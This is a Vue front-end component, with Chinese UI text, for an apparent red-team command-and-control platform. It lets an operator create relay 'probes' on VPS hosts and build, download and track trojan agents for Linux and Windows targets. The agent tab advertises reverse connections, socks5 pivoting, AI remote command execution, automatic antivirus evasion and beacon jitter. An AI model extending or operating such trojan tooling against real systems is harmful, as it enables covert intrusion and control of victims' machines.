<template>
  <div class="probe-manage">
    <a-tabs v-model:activeKey="activeTab">
      <!-- Tab 1: 探针管理 -->
      <a-tab-pane key="probe" tab="探针管理">
        <p class="tab-desc">探针部署在 VPS 上，作为平台与目标之间的加密中转节点。配置好后可生成探针可执行文件部署到指定 VPS。</p>
        <div class="toolbar">
          <a-button type="primary" @click="showProbeCreate = true">新建探针</a-button>
          <a-button @click="loadProbes" style="margin-left: 8px">刷新</a-button>
        </div>
        <a-table :dataSource="probes" :columns="probeColumns" rowKey="probe_id" :loading="probeLoading" :pagination="false" size="small" style="margin-top: 12px">
          <template #bodyCell="{ column, record }">
            <template v-if="column.key === 'status'">
              <a-tag :color="record.status === 'online' ? 'green' : record.status === 'built' ? 'blue' : 'default'">{{ probeStatusLabel(record.status) }}</a-tag>
            </template>
            <template v-if="column.key === 'created_at'">{{ fmtTime(record.created_at) }}</template>
            <template v-if="column.key === 'action'">
              <a-space>
                <a-button size="small" @click="handleProbeBuild(record)" :loading="probeBuildingId === record.probe_id">打包</a-button>
                <a-button size="small" type="primary" @click="handleProbeDownload(record)" :disabled="!record.build_path">下载</a-button>
                <a-button size="small" @click="handleProbeStatus(record)">检测</a-button>
                <a-popconfirm title="确认删除？" @confirm="handleProbeDelete(record)"><a-button size="small" danger>删除</a-button></a-popconfirm>
              </a-space>
            </template>
          </template>
        </a-table>
      </a-tab-pane>

      <!-- Tab 2: 木马管理 -->
      <a-tab-pane key="agent" tab="木马管理">
        <p class="tab-desc">木马（Agent）部署到目标机器后，经绑定的探针中转与平台通信。支持正向+反向双模式连接、内网 socks5 代理、AI 远程命令执行。生成时自动免杀处理。</p>
        <div class="toolbar">
          <a-button type="primary" @click="showAgentCreate = true">新建木马</a-button>
          <a-button @click="loadAgents" style="margin-left: 8px">刷新</a-button>
        </div>
        <a-table :dataSource="agents" :columns="agentColumns" rowKey="agent_id" :loading="agentLoading" :pagination="false" size="small" style="margin-top: 12px">
          <template #bodyCell="{ column, record }">
            <template v-if="column.key === 'status'">
              <a-tag :color="record.status === 'online' ? 'green' : record.status === 'built' ? 'blue' : 'default'">{{ agentStatusLabel(record.status) }}</a-tag>
            </template>
            <template v-if="column.key === 'probe_ids'">{{ (record.probe_ids || [record.probe_id]).map((id: string) => probeName(id)).join(', ') }}</template>
            <template v-if="column.key === 'created_at'">{{ fmtTime(record.created_at) }}</template>
            <template v-if="column.key === 'action'">
              <a-space>
                <a-button size="small" @click="handleAgentBuild(record)" :loading="agentBuildingId === record.agent_id">生成</a-button>
                <a-button size="small" type="primary" @click="handleAgentDownload(record)" :disabled="!record.build_path">下载</a-button>
                <a-button size="small" @click="handleAgentStatus(record)">状态</a-button>
                <a-popconfirm title="确认删除？" @confirm="handleAgentDelete(record)"><a-button size="small" danger>删除</a-button></a-popconfirm>
              </a-space>
            </template>
          </template>
        </a-table>
      </a-tab-pane>

      <!-- Tab 3: 蓝队探针 -->
      <a-tab-pane key="blue" tab="蓝队探针">
        <a-empty description="蓝队探针（防御探针/蜜罐）开发中，敬请期待" />
      </a-tab-pane>
    </a-tabs>

    <!-- Probe Create Modal -->
    <a-modal v-model:open="showProbeCreate" title="新建探针" @ok="handleProbeCreate" :confirmLoading="probeCreating">
      <a-form :labelCol="{ span: 6 }">
        <a-form-item label="探针名称" required><a-input v-model:value="probeForm.name" placeholder="给探针起个名" /></a-form-item>
        <a-form-item label="VPS IP" required><a-input v-model:value="probeForm.vps_ip" placeholder="公网 IP" /></a-form-item>
        <a-form-item label="监听端口"><a-input-number v-model:value="probeForm.port" :min="1" :max="65535" style="width:100%" /></a-form-item>
        <a-form-item label="通信密钥"><a-input v-model:value="probeForm.auth_key" readonly><template #addonAfter><a-button size="small" type="link" @click="genProbeKey">重新生成</a-button></template></a-input></a-form-item>
      </a-form>
    </a-modal>

    <!-- Agent Create Modal -->
    <a-modal v-model:open="showAgentCreate" title="新建木马" @ok="handleAgentCreate" :confirmLoading="agentCreating" width="560px">
      <a-form :labelCol="{ span: 6 }">
        <a-form-item label="木马名称" required><a-input v-model:value="agentForm.name" placeholder="给木马起个名" /></a-form-item>
        <a-form-item label="绑定探针" required>
          <a-select v-model:value="agentForm.probe_ids" mode="multiple" placeholder="可选择多个探针（failover）">
            <a-select-option v-for="p in probes" :key="p.probe_id" :value="p.probe_id">{{ p.name }} ({{ p.vps_ip }})</a-select-option>
          </a-select>
        </a-form-item>
        <a-form-item label="目标平台">
          <a-select v-model:value="agentForm.platform">
            <a-select-option value="linux_x64">Linux x86_64</a-select-option>
            <a-select-option value="linux_arm">Linux ARM</a-select-option>
            <a-select-option value="win_x64">Windows x86_64</a-select-option>
          </a-select>
        </a-form-item>
        <a-form-item label="回连间隔(秒)"><a-input-number v-model:value="agentForm.beacon_interval" :min="1" style="width:100%" /></a-form-item>
        <a-form-item label="抖动(%)"><a-input-number v-model:value="agentForm.beacon_jitter" :min="0" :max="100" style="width:100%" /></a-form-item>
      </a-form>
    </a-modal>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { message } from 'ant-design-vue'
import { probeApi, type ProbeConfig, type AgentConfig } from '../../api/probe'

const activeTab = ref('probe')

// ── Probe state ──
const probes = ref<ProbeConfig[]>([])
const probeLoading = ref(false)
const showProbeCreate = ref(false)
const probeCreating = ref(false)
const probeBuildingId = ref('')
const probeForm = ref({ name: '', vps_ip: '', port: 8443, auth_key: _genHex(32) })

const probeColumns = [
  { title: '名称', dataIndex: 'name', key: 'name' },
  { title: 'VPS IP', dataIndex: 'vps_ip', key: 'vps_ip' },
  { title: '端口', dataIndex: 'port', key: 'port', width: 80 },
  { title: '状态', key: 'status', width: 80 },
  { title: '创建时间', key: 'created_at', width: 160 },
  { title: '操作', key: 'action', width: 260 },
]

// ── Agent state ──
const agents = ref<AgentConfig[]>([])
const agentLoading = ref(false)
const showAgentCreate = ref(false)
const agentCreating = ref(false)
const agentBuildingId = ref('')
const agentForm = ref({ name: '', probe_ids: [] as string[], platform: 'linux_x64', beacon_interval: 5, beacon_jitter: 30 })

const agentColumns = [
  { title: '名称', dataIndex: 'name', key: 'name' },
  { title: '绑定探针', key: 'probe_ids' },
  { title: '平台', dataIndex: 'platform', key: 'platform', width: 100 },
  { title: '状态', key: 'status', width: 80 },
  { title: '创建时间', key: 'created_at', width: 160 },
  { title: '操作', key: 'action', width: 260 },
]

// ── Helpers ──
// ── Helpers ──
function _genHex(bytes: number) { const a = new Uint8Array(bytes); crypto.getRandomValues(a); return Array.from(a, b => b.toString(16).padStart(2, '0')).join('') }
function genProbeKey() { probeForm.value.auth_key = _genHex(32) }
function fmtTime(ts: number) { return ts ? new Date(ts * 1000).toLocaleString() : '-' }
function probeStatusLabel(s: string) { return ({ created: '已创建', built: '已打包', online: '在线', offline: '离线' } as Record<string,string>)[s] || s }
function agentStatusLabel(s: string) { return ({ created: '已创建', built: '已生成', online: '在线', offline: '离线' } as Record<string,string>)[s] || s }
function probeName(pid: string) { return probes.value.find(p => p.probe_id === pid)?.name || pid.slice(0, 8) }

// ── Probe CRUD ──
async function loadProbes() { probeLoading.value = true; try { probes.value = await probeApi.list('red') } catch (e: any) { message.error(e.message) } finally { probeLoading.value = false } }
async function handleProbeCreate() { if (!probeForm.value.name.trim()) { message.warning('探针名称必填'); return } if (!probeForm.value.vps_ip.trim()) { message.warning('VPS IP 必填'); return } probeCreating.value = true; try { await probeApi.create({ ...probeForm.value, type: 'red', protocol: 'https' }); message.success('创建成功'); showProbeCreate.value = false; probeForm.value = { name: '', vps_ip: '', port: 8443, auth_key: _genHex(32) }; loadProbes() } catch (e: any) { message.error(e.message) } finally { probeCreating.value = false } }
async function handleProbeBuild(r: ProbeConfig) { probeBuildingId.value = r.probe_id; try { await probeApi.build(r.probe_id); message.success('打包完成'); loadProbes() } catch (e: any) { message.error(e.message) } finally { probeBuildingId.value = '' } }
async function handleProbeDownload(r: ProbeConfig) { try { await probeApi.downloadWithAuth(r.probe_id) } catch (e: any) { message.error(e.message) } }
async function handleProbeDelete(r: ProbeConfig) { try { await probeApi.delete(r.probe_id); message.success('已删除'); loadProbes() } catch (e: any) { message.error(e.message) } }
async function handleProbeStatus(r: ProbeConfig) { try { const d = await probeApi.status(r.probe_id); (d as any).version ? message.success('在线') : message.warning('离线'); loadProbes() } catch { message.warning('不可达') } }

// ── Agent CRUD ──
async function loadAgents() { agentLoading.value = true; try { agents.value = await probeApi.agentList() } catch (e: any) { message.error(e.message) } finally { agentLoading.value = false } }
async function handleAgentCreate() { if (!agentForm.value.name.trim()) { message.warning('木马名称必填'); return } if (!agentForm.value.probe_ids.length) { message.warning('请选择至少一个探针'); return } agentCreating.value = true; try { await probeApi.agentCreate({ name: agentForm.value.name, probe_id: agentForm.value.probe_ids[0], probe_ids: agentForm.value.probe_ids, platform: agentForm.value.platform, beacon_interval: agentForm.value.beacon_interval, beacon_jitter: agentForm.value.beacon_jitter }); message.success('木马创建成功'); showAgentCreate.value = false; agentForm.value = { name: '', probe_ids: [], platform: 'linux_x64', beacon_interval: 5, beacon_jitter: 30 }; loadAgents() } catch (e: any) { message.error(e.message) } finally { agentCreating.value = false } }
async function handleAgentBuild(r: AgentConfig) { agentBuildingId.value = r.agent_id; try { await probeApi.agentBuild(r.agent_id); message.success('生成完成（含免杀）'); loadAgents() } catch (e: any) { message.error(e.message) } finally { agentBuildingId.value = '' } }
async function handleAgentDownload(r: AgentConfig) { try { await probeApi.agentDownload(r.agent_id) } catch (e: any) { message.error(e.message) } }
async function handleAgentDelete(r: AgentConfig) { try { await probeApi.agentDelete(r.agent_id); message.success('已删除'); loadAgents() } catch (e: any) { message.error(e.message) } }
async function handleAgentStatus(r: AgentConfig) { try { const d = await probeApi.agentStatus(r.agent_id); (d as any).online ? message.success('木马在线') : message.warning('木马离线'); loadAgents() } catch { message.warning('查询失败') } }

onMounted(() => { loadProbes(); loadAgents() })
</script>

<style scoped>
.probe-manage { padding: 16px; }
.toolbar { display: flex; align-items: center; }
.form-hint { font-size: 12px; color: #999; margin-top: 4px; }
.tab-desc { color: #666; font-size: 13px; margin-bottom: 12px; }
</style>